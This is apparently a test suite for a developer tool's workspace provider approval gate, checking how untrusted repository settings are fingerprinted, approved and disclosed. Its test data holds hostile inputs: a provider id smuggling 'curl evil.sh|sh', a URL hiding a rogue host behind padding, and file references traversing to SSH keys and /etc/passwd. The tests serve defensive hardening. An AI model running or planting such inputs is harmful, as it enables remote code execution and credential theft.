import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { mkdtempSync, rmSync } from 'fs';
import { homedir, tmpdir } from 'os';
import { join } from 'path';
import {
  createWorkspaceProviderGate,
  describeApiKeyDeclaration,
  describeLegacyBaseUrl,
  describeOrigin,
  describeReservedProvider,
  describeWorkspaceProvider,
  droppedProviderOverrides,
  environmentModelSelections,
  evaluateLegacyBaseUrl,
  legacyBaseUrlFingerprint,
  LEGACY_BASE_URL_ID,
  modelSelectionsOf,
  partitionWorkspaceProviders,
  persistWorkspaceProviderChoice,
  profileModelKey,
  profileOfModelKey,
  providerIdsOf,
  providerPrefixOf,
  unaffectedModelSelections,
  withEnvironmentSelections,
  withheldModelSelections,
  withoutWorkspaceProviderOverrides,
  workspaceProviderFingerprint,
  workspaceProviderRefusal,
  type ProviderLayer,
} from './provider-approvals.js';
import { loadWorkspaceTrust } from './workspace-trust.js';

let home: string;
let storePath: string;

beforeEach(() => {
  home = mkdtempSync(join(tmpdir(), 'book-provider-approvals-'));
  storePath = join(home, 'trust.json');
});

afterEach(() => {
  rmSync(home, { recursive: true, force: true });
});

describe('workspaceProviderFingerprint', () => {
  const base = { type: 'openai', baseURL: 'https://a.example/v1', apiKey: '{env:K}' } as const;

  it('is stable and covers the type, the origin and the key text', () => {
    expect(workspaceProviderFingerprint(base)).toBe(workspaceProviderFingerprint({ ...base }));
    for (const changed of [
      { ...base, type: 'anthropic' },
      { ...base, baseURL: 'https://b.example/v1' },
      { ...base, apiKey: '{env:OTHER}' },
      { ...base, apiKey: undefined },
      { ...base, apiKey: '{file:~/k}' },
    ] as const) {
      expect(workspaceProviderFingerprint(changed)).not.toBe(workspaceProviderFingerprint(base));
    }
  });

  it('reads the origin as `baseURL ?? baseUrl`, and ignores models and an omitted default type', () => {
    const { baseURL, ...rest } = base;
    expect(workspaceProviderFingerprint({ ...rest, baseUrl: baseURL })).toBe(
      workspaceProviderFingerprint(base),
    );
    expect(workspaceProviderFingerprint({ ...base, models: { m: { label: 'M' } } })).toBe(
      workspaceProviderFingerprint(base),
    );
    expect(workspaceProviderFingerprint({ ...base, type: undefined })).toBe(
      workspaceProviderFingerprint(base),
    );
  });
});

describe('partitionWorkspaceProviders', () => {
  const layers: ProviderLayer[] = [
    {
      path: '/ws/.book/settings.json',
      providers: { evil: { baseURL: 'https://e.example' }, work: { baseURL: 'https://w.example' } },
    },
    { path: '/ws/.book/settings.local.json', providers: { evil: { apiKey: 'k' } } },
  ];

  it('merges layers, skips trusted ids, and reports the declaring layers', () => {
    const partition = partitionWorkspaceProviders(layers, new Set(['work']), {});
    expect(partition.approved).toEqual([]);
    expect(partition.rejected).toEqual([]);
    expect(partition.pending).toHaveLength(1);
    const [entry] = partition.pending;
    expect(entry.id).toBe('evil');
    expect(entry.declaration).toEqual({ baseURL: 'https://e.example', apiKey: 'k' });
    expect(entry.fingerprint).toBe(workspaceProviderFingerprint(entry.declaration));
    expect(entry.layers).toEqual(['/ws/.book/settings.json', '/ws/.book/settings.local.json']);
  });

  it('sorts by the decision recorded against the matching fingerprint only', () => {
    const [{ fingerprint }] = partitionWorkspaceProviders(layers, new Set(['work']), {}).pending;
    const decide = (choice: 'approved' | 'rejected', fp = fingerprint) =>
      partitionWorkspaceProviders(layers, new Set(['work']), { evil: { fingerprint: fp, choice } });

    expect(decide('approved').approved.map((e) => e.id)).toEqual(['evil']);
    expect(decide('rejected').rejected.map((e) => e.id)).toEqual(['evil']);
    expect(decide('approved', 'stale').pending.map((e) => e.id)).toEqual(['evil']);
  });

  it('never lets an inherited property name stand for a decision', () => {
    const partition = partitionWorkspaceProviders(
      [{ path: 'p', providers: { constructor: { baseURL: 'https://c.example' } } }],
      new Set(),
      {},
    );
    expect(partition.pending.map((e) => e.id)).toEqual(['constructor']);
  });
});

describe('trusted-provider overrides', () => {
  const workspaceLayers: ProviderLayer[] = [
    {
      path: 'p',
      providers: {
        work: { baseURL: 'https://x', apiKey: 'k', type: 'anthropic', models: {} },
        evil: { baseURL: 'https://e' },
      },
    },
  ];
  const trusted = providerIdsOf([{ providers: { work: {} } }, { providers: undefined }]);

  it('reports and removes the same keys, `type` included: only `models` may merge', () => {
    expect(droppedProviderOverrides(workspaceLayers, trusted)).toEqual([
      { path: 'p', providerId: 'work', keys: ['baseURL', 'apiKey', 'type'] },
    ]);
    expect(withoutWorkspaceProviderOverrides(workspaceLayers[0].providers!, trusted)).toEqual({
      work: { models: {} },
    });
  });
});

describe('withheldModelSelections', () => {
  const layer = (trusted: boolean, model?: string) => ({
    path: trusted ? 'user' : 'ws',
    trusted,
    selections: { model },
  });

  it('applies only to a workspace winner naming a withheld id', () => {
    const withheld = new Set(['evil']);
    expect(withheldModelSelections([layer(true, 'a'), layer(false, 'evil/x')], withheld)).toEqual([
      { key: 'model', value: 'evil/x', providerId: 'evil', path: 'ws', fallback: 'a' },
    ]);
    expect(withheldModelSelections([layer(false, 'evil/x'), layer(true, 'b')], withheld)).toEqual(
      [],
    );
    expect(withheldModelSelections([layer(false, 'ok/x')], withheld)).toEqual([]);
    expect(withheldModelSelections([layer(false, 'bare')], withheld)).toEqual([]);
    expect(withheldModelSelections([layer(false, 'evil/x')], new Set())).toEqual([]);
  });
});

describe('legacy baseUrl decisions', () => {
  it('are keyed by `.bookrc.json` and fingerprinted over the URL', () => {
    const url = 'https://repo.example/v1';
    expect(evaluateLegacyBaseUrl({}, url)).toBe('pending');
    persistWorkspaceProviderChoice(
      home,
      LEGACY_BASE_URL_ID,
      legacyBaseUrlFingerprint(url),
      'approved',
      storePath,
    );
    const { workspaceProviders } = loadWorkspaceTrust(home, storePath);
    expect(evaluateLegacyBaseUrl(workspaceProviders, url)).toBe('approved');
    expect(evaluateLegacyBaseUrl(workspaceProviders, 'https://other.example')).toBe('pending');
  });
});

describe('persistWorkspaceProviderChoice', () => {
  it('records a decision and leaves the others alone', () => {
    persistWorkspaceProviderChoice(home, 'a', 'fp-a', 'approved', storePath);
    persistWorkspaceProviderChoice(home, 'b', 'fp-b', 'rejected', storePath);
    expect(loadWorkspaceTrust(home, storePath).workspaceProviders).toEqual({
      a: { fingerprint: 'fp-a', choice: 'approved' },
      b: { fingerprint: 'fp-b', choice: 'rejected' },
    });
  });
});

describe('workspaceProviderRefusal', () => {
  const workspace = '/work/repo';

  it('names the provider and the command, and renders control characters inert', () => {
    const message = workspaceProviderRefusal('evil', 'evil/x', workspace);
    expect(message).toContain('declared by the workspace');
    expect(message).toContain('`book trust provider evil --workspace /work/repo`');
    expect(workspaceProviderRefusal('e\u001b[2Jvil', 'e\u001b[2Jvil/x', workspace)).not.toContain(
      '\u001b',
    );
  });

  // Finding 1: the id is any JSON key the repository writes.
  it('quotes an id with spaces, and never pastes one a shell would interpret', () => {
    expect(workspaceProviderRefusal('my prov', 'my prov/x', workspace)).toContain(
      '`book trust provider "my prov" --workspace /work/repo`',
    );

    const hostile = 'x $(curl evil.sh|sh)';
    const message = workspaceProviderRefusal(hostile, `${hostile}/m`, workspace);
    // The id is named in prose, escaped; the command line is the listing, which has no id in it.
    expect(message).toContain('`book trust provider --workspace /work/repo`');
    const command = /`(book trust[^`]*)`/.exec(message)![1];
    expect(command).not.toContain('$(');
    expect(command).not.toContain('curl');
    expect(workspaceProviderRefusal('a"b', 'a"b/x', workspace)).toContain(
      '`book trust provider --workspace /work/repo`',
    );
  });

  it('refuses to put an id that looks like an option on the command line', () => {
    expect(workspaceProviderRefusal('--all-pending', '--all-pending/x', workspace)).toContain(
      '`book trust provider --workspace /work/repo`',
    );
  });
});

// Finding 2: the disclosure shows what a request would actually reach, in full. The renderer's
// 200-character cut let a long run of filler push the real host or file out of sight.
describe('describeOrigin', () => {
  it('shows an absent origin as the default endpoint', () => {
    expect(describeOrigin(undefined)).toBe('(no baseURL: the default endpoint)');
  });

  it('shows the parsed protocol, host and port, not the text as written', () => {
    expect(describeOrigin('https://api.example.com:8443/v1/chat?x=1')).toBe(
      'https://api.example.com:8443',
    );
    expect(describeOrigin('http://localhost:1234/v1')).toBe('http://localhost:1234');
  });

  it('shows the real host of a URL that hides it behind a long userinfo, and flags it', () => {
    const hidden = `https://api.openai.com:${'x'.repeat(200)}@evil.example/v1`;
    const shown = describeOrigin(hidden);
    expect(shown.startsWith('https://evil.example')).toBe(true);
    expect(shown).toContain('userinfo');
    // The filler is not echoed, so the line is short however long the declaration was.
    expect(shown).not.toContain('xxxx');
    expect(shown.length).toBeLessThan(200);
  });

  it('flags a value that does not parse as a URL, with control characters escaped', () => {
    const shown = describeOrigin('not a url\u001b[2J\n');
    expect(shown).toContain('not a valid URL');
    expect(shown).not.toContain('\u001b');
    expect(shown).not.toContain('\n');
  });

  it('keeps an internationalised host in its punycode form', () => {
    expect(describeOrigin('https://аpple.example/')).toBe('https://xn--pple-43d.example');
  });
});

describe('describeApiKeyDeclaration', () => {
  const workspace = '/work/repo';

  it('shows the variable an {env:} reference names, and flags a malformed name', () => {
    expect(describeApiKeyDeclaration('{env:OPENAI_API_KEY}', workspace)).toBe(
      'environment variable OPENAI_API_KEY',
    );
    expect(describeApiKeyDeclaration('{env:BAD NAME\u001b}', workspace)).toContain(
      'not a valid variable name',
    );
    expect(describeApiKeyDeclaration('{env:BAD NAME\u001b}', workspace)).not.toContain('\u001b');
  });

  it('shows the normalised path of a {file:} reference: home expanded, `..` resolved, in full', () => {
    const traversal = `{file:~/.config/${'a/../'.repeat(40)}.ssh/id_ed25519}`;
    // The written text is over 200 characters, so the old renderer cut it before the real name.
    expect(traversal.length).toBeGreaterThan(200);
    expect(describeApiKeyDeclaration(traversal, workspace)).toBe(
      `file ${join(homedir(), '.config', '.ssh', 'id_ed25519')}`,
    );
  });

  it('does not truncate a long resolved path', () => {
    const long = join(homedir(), 'k'.repeat(300));
    expect(describeApiKeyDeclaration(`{file:~/${'k'.repeat(300)}}`, workspace)).toBe(
      `file ${long}`,
    );
  });

  it('resolves a relative path against the workspace and flags one that leaves it', () => {
    expect(describeApiKeyDeclaration('{file:secrets/key}', workspace)).toBe(
      `file ${join(workspace, 'secrets', 'key')}`,
    );
    expect(describeApiKeyDeclaration('{file:../../etc/passwd}', workspace)).toContain(
      'outside the workspace',
    );
  });

  it('shows an absolute path normalised, and never echoes a literal', () => {
    expect(describeApiKeyDeclaration('{file:/a/b/../c}', workspace)).toBe('file /a/c');
    expect(describeApiKeyDeclaration('sk-secret', workspace)).toBe('a literal key (not shown)');
    expect(describeApiKeyDeclaration(undefined, workspace)).toBe('none');
  });
});

describe('describeWorkspaceProvider', () => {
  const entry = (declaration: Record<string, unknown>) => ({
    id: 'meta-llama',
    declaration,
    fingerprint: 'fp',
    layers: ['/ws/.book/settings.json'],
  });

  it('shows the id, the parsed origin and the key reference on one line', () => {
    const [line, ...rest] = describeWorkspaceProvider(
      entry({ baseURL: 'https://team.example:9443/v1', apiKey: '{env:TEAM_KEY}' }),
      '/ws',
    );
    expect(line).toBe('meta-llama  https://team.example:9443  key: environment variable TEAM_KEY');
    expect(rest).toEqual([]);
  });

  // Finding 4(b)
  it("warns that approving it also routes the user's own selections with that prefix", () => {
    const lines = describeWorkspaceProvider(entry({ baseURL: 'https://team.example/v1' }), '/ws', [
      {
        key: 'model',
        value: 'meta-llama/llama-3-70b',
        providerId: 'meta-llama',
        source: '/u/s.json',
      },
      {
        key: 'compactModel',
        value: 'meta-llama/small',
        providerId: 'meta-llama',
        source: 'BOOK_COMPACT_MODEL',
      },
    ]);
    expect(lines).toHaveLength(2);
    expect(lines[1]).toContain('approving it also routes your own selections');
    expect(lines[1]).toContain('https://team.example');
    expect(lines[1]).toContain('model "meta-llama/llama-3-70b" (from /u/s.json)');
    expect(lines[1]).toContain('compactModel "meta-llama/small" (from BOOK_COMPACT_MODEL)');
  });
});

// Finding 7
describe('describeLegacyBaseUrl', () => {
  const providers = {
    lab: { baseURL: 'http://localhost:9/v1', apiKey: 'k' },
    keyless: { apiKey: '{env:LAB_KEY}' },
    legacyShape: { baseUrl: 'http://x.example/v1' },
    zeta: {},
  };

  it('names the default endpoint and exactly what it would receive', () => {
    const text = describeLegacyBaseUrl('https://repo.example/v1', {
      providers,
      workspace: '/ws',
    }).join('\n');
    expect(text).toContain('.bookrc.json  https://repo.example  would become the default endpoint');
    expect(text).toContain('BOOK_API_KEY');
    // Providers with no baseURL, by id, with the shape of their key; not the ones that set one.
    expect(text).toContain('keyless (key: environment variable LAB_KEY)');
    expect(text).toContain('zeta (key: none)');
    expect(text).not.toContain('lab (');
    expect(text).not.toContain('legacyShape');
    expect(text).toContain('every plain model id');
    expect(text).toContain('<vendor>/<model>');
  });

  it('says so when every provider sets its own baseURL', () => {
    const text = describeLegacyBaseUrl('https://repo.example/v1', {
      providers: { lab: providers.lab },
      workspace: '/ws',
    }).join('\n');
    expect(text).toContain('no provider key');
  });
});

describe('a provider named like the legacy decision key', () => {
  it('is reserved: never approved, whatever the store holds', () => {
    const layers: ProviderLayer[] = [
      { path: 'p', providers: { '.bookrc.json': { baseURL: 'https://e.example' } } },
    ];
    const fingerprint = workspaceProviderFingerprint(layers[0].providers!['.bookrc.json']);
    const partition = partitionWorkspaceProviders(layers, new Set(), {
      '.bookrc.json': { fingerprint, choice: 'approved' },
    });
    expect(partition.approved).toEqual([]);
    expect(partition.pending).toEqual([]);
    expect(partition.reserved.map((e) => e.id)).toEqual(['.bookrc.json']);
    const gate = createWorkspaceProviderGate({ partition });
    expect(gate.declared).toEqual(['.bookrc.json']);
    expect(gate.withheld).toEqual(['.bookrc.json']);
    expect(describeReservedProvider(partition.reserved[0])).toContain('reserved');
  });
});

describe('createWorkspaceProviderGate', () => {
  it('derives declared and withheld from the partition, so they cannot drift from it', () => {
    const layers: ProviderLayer[] = [
      { path: 'p', providers: { a: { baseURL: 'https://a' }, b: { baseURL: 'https://b' }, c: {} } },
    ];
    const fp = (id: string) => workspaceProviderFingerprint(layers[0].providers![id]);
    const partition = partitionWorkspaceProviders(layers, new Set(), {
      a: { fingerprint: fp('a'), choice: 'approved' },
      b: { fingerprint: fp('b'), choice: 'rejected' },
    });
    const gate = createWorkspaceProviderGate({ partition });
    expect(gate.declared.sort()).toEqual(['a', 'b', 'c']);
    expect(gate.withheld.sort()).toEqual(['b', 'c']);
  });
});

describe('model selection slots', () => {
  const layer = (trusted: boolean, selections: Record<string, string | undefined>) => ({
    path: trusted ? 'user' : 'ws',
    trusted,
    selections,
  });

  it('reads the top-level keys and every agent profile model from a document', () => {
    expect(
      modelSelectionsOf({
        model: 'a/x',
        agents: { profiles: { explorer: { model: 'b/y' }, patcher: { effort: 'low' }, bad: 3 } },
      }),
    ).toEqual({
      model: 'a/x',
      compactModel: undefined,
      advisorModel: undefined,
      'agents.profiles.explorer.model': 'b/y',
    });
    expect(modelSelectionsOf({})).toEqual({
      model: undefined,
      compactModel: undefined,
      advisorModel: undefined,
    });
  });

  it('withholds a workspace profile model naming a withheld provider, falling back to the trusted one', () => {
    const key = profileModelKey('explorer');
    expect(profileOfModelKey(key)).toBe('explorer');
    expect(profileOfModelKey('model')).toBeUndefined();
    expect(
      withheldModelSelections(
        [layer(true, { [key]: 'ok/x' }), layer(false, { [key]: 'evil/x' })],
        new Set(['evil']),
      ),
    ).toEqual([{ key, value: 'evil/x', providerId: 'evil', path: 'ws', fallback: 'ok/x' }]);
  });

  it('reports a trusted winner naming a withheld provider as unaffected, never as withheld', () => {
    const withheld = new Set(['evil']);
    const layers = [layer(false, { model: 'evil/a' }), layer(true, { model: 'evil/b' })];
    expect(withheldModelSelections(layers, withheld)).toEqual([]);
    expect(unaffectedModelSelections(layers, withheld)).toEqual([
      { key: 'model', value: 'evil/b', providerId: 'evil', source: 'user' },
    ]);
    // A workspace winner is withheld, not unaffected.
    expect(unaffectedModelSelections([layer(false, { model: 'evil/a' })], withheld)).toEqual([]);
  });

  it('lets --model and the environment replace the layers entry for their key', () => {
    const withheld = new Set(['evil']);
    const fromLayers = [
      { key: 'model', value: 'evil/a', providerId: 'evil', source: 'user' },
      { key: 'advisorModel', value: 'evil/adv', providerId: 'evil', source: 'user' },
    ];
    expect(
      withEnvironmentSelections(
        fromLayers,
        environmentModelSelections('evil/cli', {
          BOOK_MODEL: 'evil/env',
          BOOK_COMPACT_MODEL: 'evil/c',
        }),
        withheld,
      ),
    ).toEqual([
      { key: 'advisorModel', value: 'evil/adv', providerId: 'evil', source: 'user' },
      { key: 'model', value: 'evil/cli', providerId: 'evil', source: '--model' },
      { key: 'compactModel', value: 'evil/c', providerId: 'evil', source: 'BOOK_COMPACT_MODEL' },
    ]);
    // An environment value that names no withheld provider hides the layer's entry too.
    expect(
      withEnvironmentSelections(
        fromLayers,
        environmentModelSelections(undefined, { BOOK_MODEL: 'fine' }),
        withheld,
      ).map((s) => s.key),
    ).toEqual(['advisorModel']);
  });

  // Finding 6: one prefix function, read through whitespace.
  it('reads the provider prefix through surrounding whitespace', () => {
    expect(providerPrefixOf(' evil/x')).toBe('evil');
    expect(providerPrefixOf('evil/x ')).toBe('evil');
    expect(providerPrefixOf('bare')).toBeUndefined();
    expect(providerPrefixOf('/x')).toBeUndefined();
    expect(
      withheldModelSelections([layer(false, { model: ' evil/x' })], new Set(['evil'])),
    ).toHaveLength(1);
  });
});
